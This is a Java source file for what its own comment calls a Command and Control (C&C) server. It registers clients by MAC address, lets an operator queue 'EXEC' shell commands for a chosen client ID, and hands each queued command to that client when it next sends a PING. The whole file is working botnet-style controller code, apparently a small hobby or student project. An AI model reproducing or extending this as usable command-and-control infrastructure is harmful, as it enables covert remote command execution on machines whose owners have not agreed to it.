package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.HashMap;

import tools.Command;
import tools.ParsedCommand;

/**
 * Represents a Command and Control (C&C) server
 * 
 * @author Yohan Chalier
 *
 */
public class CommandServer implements RequestHandler, CommandHandler {
	
	// The string sent when no matching command is found
	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
	
	// The sets of commands for both the server and the client
	private final HashMap<String, Command> cmdsServer;
	private final HashMap<String, Command> cmdsClient;
	
	// The set of connected clients IPs
	private ClientPool clients;
	
	public CommandServer() {
		clients = new ClientPool();
		
		cmdsServer = new HashMap<String, Command>();
		cmdsClient = new HashMap<String, Command>();
		
		// Display available commands
		cmdsServer.put("help", new Command(){
			@Override
			public String exec(String[] args) {
				StringBuilder builder = new StringBuilder();
				
				for (String key: cmdsServer.keySet())
					builder.append(key + '\n');
				
				// Removing last '\n'
				builder.setCharAt(builder.length() - 1, (char) 0);
				
				return builder.toString();
			}
		});
		
		// Close user input
		cmdsServer.put("exit", new Command(){
			@Override
			public String exec(String[] args) {
				return null;
			}
		});
		
		cmdsServer.put("exec", new Command(){
			@Override
			public String exec(String[] args) {
				ConnectedClient client;
				if ((client = identify(args[0])) != null) {
					StringBuilder cmd = new StringBuilder();
					cmd.append("EXEC ");
					for (int i = 1; i < args.length; i++){
						cmd.append(args[i]
								+ (i == args.length - 1 ? "" : " "));
					}
					client.stackCmd(cmd.toString());
					return "Added command to stack";
				}
				return "No corresponding client (" + args[0] + ") found.";
			}
		});
		
		// Assign an ID to a client
		cmdsClient.put("GETID", new Command(){
			
			@Override
			public String exec(String[] args) {

				ConnectedClient client = clients.findByMac(args[0]);
				
				if (client != null) { // Already known client
					return Integer.toString(client.getId());
				} else { // New client
					return Integer.toString(clients.addClient(args[0]));
				}
				
			}
		});
		
		// Answer a ping
		cmdsClient.put("PING", new Command(){
			@Override
			public String exec(String[] args) {
				ConnectedClient client;
				if ((client = identify(args[0])) != null && client.hasCmd()) {
					return client.popCmd();
				}
				return "PONG";
			}
		});
		
		// ADD COMMANDS HERE
		
	}
	
	private ConnectedClient identify(String idStr) {
		if (clients.containsKey(Integer.parseInt(idStr))) {
			return clients.get(Integer.parseInt(idStr));
		}
		return null;
	}

	@Override
	public String getResponse(Socket socket)
			throws IOException {
		
		// TODO: Identify client
		// InetAddress client = socket.getInetAddress();
		
		// Reading request
		BufferedReader reader = new BufferedReader(
    			new InputStreamReader(socket.getInputStream()));
		
		StringBuilder builder = new StringBuilder();
		
		// Reading POST header
		String line;
		int contentLength = 0;
		final String contentHeader = "Content-Length: ";
		while (!(line = reader.readLine()).equals("")) {
			if (line.startsWith(contentHeader)) {
				contentLength = Integer.parseInt(
						line.substring(contentHeader.length()));
			}
 		}
		
		// Reading POST body
		int c = 0;
		for (int i = 0; i < contentLength; i++){
			c = reader.read();
			builder.append((char) c);
		}
		String request = builder.toString();
				
		// TODO log
		System.out.print("\n" + socket.getInetAddress()
						+ ": " + request + "\n>");
		
		// Executing command
		ParsedCommand pCmd = new ParsedCommand(request);
		if (cmdsClient.containsKey(pCmd.cmd))
			return cmdsClient.get(pCmd.cmd).exec(pCmd.args);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String executeCommand(String cmd) {
		ParsedCommand pCmd = new ParsedCommand(cmd);
		if (cmdsServer.containsKey(pCmd.cmd))
			return cmdsServer.get(pCmd.cmd).exec(pCmd.args);
		return ERROR_COMMAND_NOT_FOUND;
	}
	
}
